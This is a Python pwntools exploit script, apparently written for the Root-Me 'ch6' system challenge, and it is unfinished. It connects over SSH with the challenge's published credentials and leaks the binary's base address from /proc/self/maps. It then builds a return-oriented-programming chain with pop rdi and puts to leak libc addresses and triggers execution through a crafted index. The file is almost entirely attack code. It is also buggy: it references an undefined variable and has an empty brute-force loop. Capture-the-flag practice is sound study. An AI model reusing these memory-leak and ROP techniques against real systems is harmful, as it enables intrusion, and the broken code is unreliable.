from pwn import * 
import sys
from time import sleep

def send(line):
    print(" --> Sending: ", line.decode())
    target.sendline(line)


def pwn_it(guessed_address = 0x0):
    print(target.recv().decode())
    send(b"2")
    print(target.recv().decode())
    send(b"/proc/self/maps")
    line = target.recvuntil(": ").decode().strip()
    print(" --> Get: ",line)
    start_address = line.split()[0].split("-")[0]
    print(" --> start address is:", start_address)
    offset = int(start_address, 16) 
    print(f" --> offset is (decimal): {offset}, in hex: {hex(offset)}")
    
    exit_prog = 0x1cc0
    puts = 0x202ee0
    pop_rdi = 0x1e33
    pop_rsi_r15 = 0x1e31
     
    chose = 'puts'
    if chose not in code:
        print(chose, "not in", code)
        exit(1)
    
#     print(" --> Checksec:")
#     binary = ELF("/home/clemab/Desktop/cs/ch6")
#     binary.address = offset
#     #print("\nChecksec:\n",binary.checksec())
#     print(" --> Loading gadgets::")
#     rop = ROP(binary)
#     
#     rop(rdi=binary.plt["puts"])
#     print(rop.dump())
#     print(rop.chain())

    rop = p64(offset+pop_rdi) + p64(offset+puts) + p64(offset+puts)

#     print(f"To execute '{chose}' put {p64(offset + code[chose])} in /tmp/exec")
    print(f"To leak puts address put {rop} in /tmp/exec")
    print("Pausing pwning")

    target.interactive()

    execute_code = b"-8198"

    print("Restarting pwning")

    send(b"2")
    print(target.recv().decode())
    send(b"/tmp/exec")

    print(target.recv())
    send(execute_code)

    

    
    


if len(sys.argv) != 2:
    print("remote, local or plz_pwn ?")
    exit(1)

target = None
if sys.argv[1] == "remote":
    host = ssh(user="app-systeme-ch6",
           host="challenge03.root-me.org",
           port=2223,
           password="app-systeme-ch6")

    target = host.process("./ch6")

    pwn_it()
    target.interactive()
elif sys.argv[1] == "local":
    target = process("./ch6")
    #gdb.attach(target, gdbscript='b *display_file_content+278')
    gdb.attach(target, gdbscript='b *display_shifted_file_content+400')
    pwn_it()
    target.interactive()
elif sys.argv[1] == "plz_pwn":
    print("Doesn't defined")
    for i in range( 0x0 , 0x0 , 0x10 ): 
        target = None
        pwn_it(i)
        try: 
            target.recvline()
        except EOFError:
            pass
        except:
            target.interactive()
        else:
            target.interactive()
        target.kill()
else:
    print("remote, local or plz_pwn ?")
    exit(1)


